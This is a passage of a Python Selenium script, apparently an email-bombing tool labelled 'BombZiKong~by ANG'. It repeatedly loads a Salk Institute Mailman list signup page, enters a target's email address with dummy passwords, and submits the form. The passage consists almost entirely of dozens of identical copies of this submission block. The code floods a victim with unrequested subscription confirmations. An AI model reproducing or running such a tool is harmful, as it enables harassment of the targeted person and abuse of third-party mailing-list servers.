pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))


browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))



browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
pas.send_keys('q')
#confirm
confrim = browser.find_element_by_name('email-button')
confrim.click()
print(bcolors.Magenta + """[+]BombZiKong~by ANG: succes!""")
time.sleep(int(num))

browser.get("http://snake.salk.edu/mailman/listinfo/salk-bulletin")
#email
email = browser.find_element_by_name('email')
email.click()
email.send_keys(username)
#pass 1
pw = browser.find_element_by_name('pw')
pw.click()
pw.send_keys('q')
#pass 2
pas = browser.find_element_by_name('pw-conf')
pas.click()
